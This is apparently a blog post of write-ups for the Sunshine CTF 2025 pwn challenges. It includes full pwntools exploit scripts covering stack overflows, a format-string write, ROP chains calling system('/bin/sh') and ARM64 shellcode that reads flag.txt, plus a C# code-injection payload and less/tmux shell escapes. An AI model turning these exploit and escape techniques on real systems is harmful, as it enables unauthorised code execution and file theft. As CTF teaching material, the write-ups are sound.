---
title: "Write-ups: Sunshine CTF 2025"
published: 2025-09-29
updated: 2025-09-29
description: "Write-ups for Sunshine CTF 2025 pwn aspect."
tags: ["Pwn", "Write-ups"]
category: "Write-ups"
draft: false
---

# i95

这个方向都是栈 Pwn，很简单，直接 AK 了。

## Miami

### Information

- Category: Pwn
- Points: 100

### Description

> Dexter is the prime suspect of being the Bay Harbor Butcher, we break into his login terminal and get the proof we need!

### Write-up

覆盖变量值即可。

### Exploit

```python
#!/usr/bin/env python3

from pwn import (
    args,
    context,
    flat,
    process,
    raw_input,
    remote,
)


FILE = "./miami"
HOST, PORT = "chal.sunshinectf.games", 25601

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary


def launch():
    global target
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)


def main():
    launch()

    payload = flat(
        b"A" * 0x4C,
        0x1337C0DE,
    )
    raw_input("DEBUG")
    target.sendlineafter(b"Enter Dexter's password: ", payload)

    target.interactive()


if __name__ == "__main__":
    main()
```

### Flag

:spoiler[`sun{DeXtEr_was_!nnocent_Do4kEs_w4s_the_bAy_hRrb0ur_bu7cher_afterall!!}`]

## Jupiter

### Information

- Category: Pwn
- Points: 100

### Description

> Jupiter just announced their new Brightline junction... the ECHO TERMINAL!!!

### Write-up

`dprintf(2, (const char *)buf)`，明显格式化字符串，改 `secret_key == 322420958` 即可，后两字节没问题，直接改高字节。

### Exploit

```python
#!/usr/bin/env python3

from pwn import (
    ROP,
    args,
    context,
    flat,
    p64,
    process,
    raw_input,
    remote,
)

FILE = "./jupiter"
HOST, PORT = "chal.sunshinectf.games", 25607

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary
rop = ROP(elf)


def launch():
    global target
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)


def main():
    launch()

    secret = 0x404010
    payload = flat(
        b"aaaaa%4914c%7$hn",
        p64(secret + 0x2),
    )
    raw_input("DEBUG")
    target.sendlineafter(b"Enter data at your own risk: ", payload)

    target.interactive()


if __name__ == "__main__":
    main()
```

### Flag

:spoiler[`sun{F0rmat_str!ngs_4re_sup3r_pOwerFul_r1gh7??}`]

## Canaveral

### Information

- Category: Pwn
- Points: 100

### Description

> NASA Mission Control needs your help... only YOU can enter the proper launch sequence!!

### Write-up

这题有点爆炸，一开始自己在 bss 上写 `/bin/sh` 字符串，远程老打不通，调试发现它会把我写的字符串清空……后来用程序自带的 `/bin/sh` 字符串地址就打通了，目前还没搞明白为什么自己写的不行，日后有空再研究。

### Exploit - I

```python
#!/usr/bin/env python3

from pwn import (
    ROP,
    args,
    context,
    flat,
    process,
    raw_input,
    remote,
)


FILE = "./canaveral"
HOST, PORT = "chal.sunshinectf.games", 25603

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary
rop = ROP(elf)


def launch():
    global target
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)


def main():
    launch()

    read = 0x401289
    system = 0x401218
    payload = flat(
        b"A" * 0x40,
        elf.bss() + 0xF00,
        read,
    )
    raw_input("DEBUG")
    target.sendlineafter("Enter the launch sequence: ", payload)

    payload = flat(
        b"A" * 0x38,
        next(elf.search(b"/bin/sh")),
        0x404F28,
        system,
    )
    target.sendline(payload)
    target.interactive()


if __name__ == "__main__":
    main()
```

### Exploit - II

下面是自己构造 `/bin/sh` 的成功版，我发现只要把自己构造的 `/bin/sh` 和调用 system 的 ROP Chain 写在相同的区域，libc 内部就会破坏 `/bin/sh`，那干脆试试写到别的地方去，比如这里写入到栈中（注意栈上也会因为重叠问题，导致部分输入被破坏，不过还是有没被破坏的地方可以用的）：

```python
#!/usr/bin/env python3

from pwn import (
    ROP,
    args,
    context,
    flat,
    process,
    raw_input,
    remote,
)


FILE = "./canaveral"
HOST, PORT = "chal.sunshinectf.games", 25603

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary
rop = ROP(elf)


def launch():
    global target
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)


def main():
    launch()

    read = 0x401289
    system = 0x401218
    payload = flat(
        b"A" * 0x18,
        b"/bin/sh\x00",
        b"A" * 0x20,
        elf.bss() + 0xF00,
        read,
    )
    raw_input("DEBUG")
    target.sendlineafter("Enter the launch sequence: ", payload)
    target.recvuntil(b"prize: ")
    stack = int(target.recvline().strip(), 16)
    binsh = stack + 0x18
    target.success(hex(stack))

    payload = flat(
        b"A" * 0x38,
        binsh,
        0x404F28,
        system,
    )
    target.sendline(payload)
    target.interactive()


if __name__ == "__main__":
    main()
```

### Flag

:spoiler[`sun{D!d_y0u_s3e_thE_IM4P_spAce_laUncH??}`]

## Jacksonville

### Information

- Category: Pwn
- Points: 100

### Description

> The Jacksonville Jaguars are having a rough season, let's cheer them on!!

### Write-up

First Blood! 没难度，就是平台在开玩笑，拿到 flag 了提交上去告诉我不对……然后我疯狂按提交按钮结果就成功了……

### Exploit

```python
#!/usr/bin/env python3

from pwn import (
    ROP,
    args,
    context,
    flat,
    process,
    raw_input,
    remote,
)


FILE = "./jacksonville"
HOST, PORT = "chal.sunshinectf.games", 25602

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary
rop = ROP(elf)


def launch():
    global target
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)


def main():
    launch()

    answer = b"aaaaaaJaguars\x00"
    length = len(answer)

    payload = flat(
        answer,
        b"A" * (0x68 - length),
        rop.ret.address,
        elf.sym["win"],
    )
    raw_input("DEBUG")
    target.sendlineafter(b"> ", payload)

    target.interactive()


if __name__ == "__main__":
    main()
```

### Flag

:spoiler[`sun{D!d_y0u_s3e_thE_IM4P_spAce_laUncH??}`]

## Daytona

### Information

- Category: Pwn
- Points: 100

### Description

> Cops don't like it when you drive like you're in the Daytona 500 :/

### Write-up

<s>_这可是我的第一次。_</s>

bro 第一次做（成） arm 架构 pwn，虽然最后还是自己提供思路，让 AI 写的 shellcode……嗯，这次不算数～

一开始直接 shellcraft 打 execve，结果本地通了远程不行，后来试了下换成 ORW，还是本地可以，远程不行……最后才知道，ARM 架构的 CPU 通常有分离的数据缓存 (`D-Cache`) 和指令缓存 (`I-Cache`)，我们写入 shellcode 的而时候数据先进入 `D-Cache`，跳转到这段代码时，CPU 还是会继续从 `I-Cache` 中读取指令。如果 CPU 流水线和 `I-Cache` 中仍然存有这段内存地址上的旧代码，它就会执行错误的代码，所以我远程打不通。本地能通是因为 QEMU 通常会自动处理缓存同步问题。

解决方法是使用一个叫做 `Cache Invalidation Gadget` 的东西，手动刷新流水线：

- `dc`：清理 `D-Cache`，将新写入的 shellcode 推送到主存
- `ic + isb`：清理 `I-Cache` 和 CPU 流水线，强制 CPU 从内存中加载新写入的 shellcode，从而保证 shellcode 能够正确执行

得抽空去学一下其它架构的指令集了，不然真不行，这是我最近碰到的第二个 arm pwn 了。

### Exploit

```python
#!/usr/bin/env python3

from pwn import (
    args,
    asm,
    context,
    flat,
    process,
    raw_input,
    remote,
    shellcraft,
)


FILE = "./daytona"
HOST, PORT = "chal.sunshinectf.games", 25606

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary


def launch():
    global target
    if args.L:
        # target = process(["qemu-aarch64", "-g", "1234", FILE])
        target = process(["qemu-aarch64", FILE])
    else:
        target = remote(HOST, PORT)


def main():
    launch()

    target.recvuntil(b"The cops said I was going ")
    stack = int(target.recvuntil(b" ").strip(), 10) + 117
    target.success(f"stack: {hex(stack)}")

    # shellcode = asm(shellcraft.execve("/bin/sh", 0, 0))
    # shellcode = shellcraft.open("flag.txt", 0, 0)
    # shellcode += shellcraft.sendfile(1, "x0", 0, 0x1000)

    shellcode = asm("""
        // cache invalidation gadget
        adr x9, orw
        dc cvau, x9
        add x10, x9, #0x40
        dc cvau, x10
        dsb ish
        ic ivau, x9
        ic ivau, x10
        dsb ish
        isb

    orw:
        // openat(dfd=AT_FDCWD, filename="flag.txt", flags=0, mode=0)
        // AT_FDCWD = 0xFFFFFFFFFFFFFF9C (-100)
        mov x0, #-100
        adr x1, filename
        mov x2, #0
        mov x3, #0
        mov x8, #56
        svc #0

        // sendfile(out_fd=1, in_fd=X0, offset=0, count=0x1000)
        mov x1, x0
        mov x0, #1
        mov x2, #0
        mov x3, #0x100
        mov x8, #71
        svc #0

    filename:
        .ascii "flag.txt\\x00"
    """)

    length = len(shellcode)
    target.warn(f"shellcode length: {hex(length)}")

    payload = flat(
        b"A" * 0x48,
        stack + 0x48 + 0x8,
        shellcode,
    )
    raw_input("DEBUG")
    target.sendlineafter(b"What do I tell them??", payload)

    target.interactive()


if __name__ == "__main__":
    main()
```

### Exploit

:spoiler[`sun{ARM64_shEl1c0de_!s_pr3ttY_n3a7_dOnT_y0u_thInk?}`]

# Pwn

这个方向真的是 Pwn 吗，怎么题目都那么奇怪？？

`HAL9000` 是一道贼恶心的 mov obfuscated 的题，`demovfuscator` 了以后和原先也区别不大，还是一堆 `mov` 指令，坐牢啊……

`Space Is Less Than Ideal` 和 `Space Is My Banner` 感觉这两道更像 Misc，与 Pwn 一点关系都没有……

`AstroJIT AI` 是代码审计吧，也和 Pwn 没关系啊……

唯一一个 heap 我还因为没怎么学过堆，做不来……

`Clone Army` 没细看，后面有空复现吧。

## AstroJIT AI

### Information

- Category: Pwn
- Points: 500

### Description

> AstroJIT AI, your new general-purpose chatbot for the future!

### Write-up

测试格式化字符串，报错：

<center>
  <img src="https://cdn.jsdmirror.com/gh/CuB3y0nd/picx-images-hosting@master/.1ovt15ht5d.avif" alt="" />
</center>

问 AI，可以注入代码，直接用 `{ int.Parse(System.IO.File.ReadAllText("flag.txt")), 0, 0 }`，由于 flag 内容不是整数，报错信息直接把 flag 输出了。

```csharp showLineNumbers=false
Weights: { int.Parse(System.IO.File.ReadAllText("flag.txt")), 0, 0 }
{ int.Parse(System.IO.File.ReadAllText("flag.txt")), 0, 0 }
MethodInvocationException: /app/evil_corp_ai.ps1:424
Line |
 424 |              $weights = [Two.Second.Scholars.Mass.And.Partialities.Wei …
     |              ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     | Exception calling "CalculatePrecompiledWeights" with "0" argument(s):
     | "The input string
     | 'sun{evil-corp-one-uprising-at-a-time-folks-may-be-evil-but-do-not-get-burnt-out-just-burn-the-building-down-before-you-go-we-need-the-insurance-money} ' was not in a correct format."
```

### Flag

:spoiler[`sun{evil-corp-one-uprising-at-a-time-folks-may-be-evil-but-do-not-get-burnt-out-just-burn-the-building-down-before-you-go-we-need-the-insurance-money}`]

## Space Is Less Than Ideal

### Information

- Category: Pwn
- Points: 500

### Description

> I think i did a thing.
> I may have accessed a satellite.
> I can access the logs anyhow. I can't seem to access anything else.
> I know I've seen that type of log viewer before, but something seems... different... about it.
> Well you know the expression. Less is more!

### Write-up

`less` 逃逸，调教 AI 就好了。先输入 `ma` 设置 mark，然后输入 `|a` 就可以执行指令。`ls` 发现有 `cat-flag`，重复上面的步骤调用这个程序就好了。

另外，刚开始测试 `!command` 发现没有用，但是可以看到后台指令执行结果，所以要看结果的时候可以通过这个方式查看。

### Flag

:spoiler[`sun{less-is-more-no-really-it-is-just-a-symbolic-link}`]

## Space Is My Banner

### Information

- Category: Pwn
- Points: 500

### Description

> I did it again.
> This time I'm sure I accessed a satellite.
> I'm scared, it's giving me a warning message when I log in.
> I think this time I may have gone too far... this seems to be some top security stuff...

### Write-up

这次是 tmux 逃逸，在 Security Prompt 中按 `Ctrl-B` 然后输入 `:` 就可以输入一些内置 tmux 指令了，直接用核武 `:run-shell "ls -al"` 然后 `:run-shell "./cat-flag"`。

### Flag

:spoiler[`sun{wait-wait-wait-you-cannot-hack-me-you-agreed-to-not-do-that-that-is-not}`]
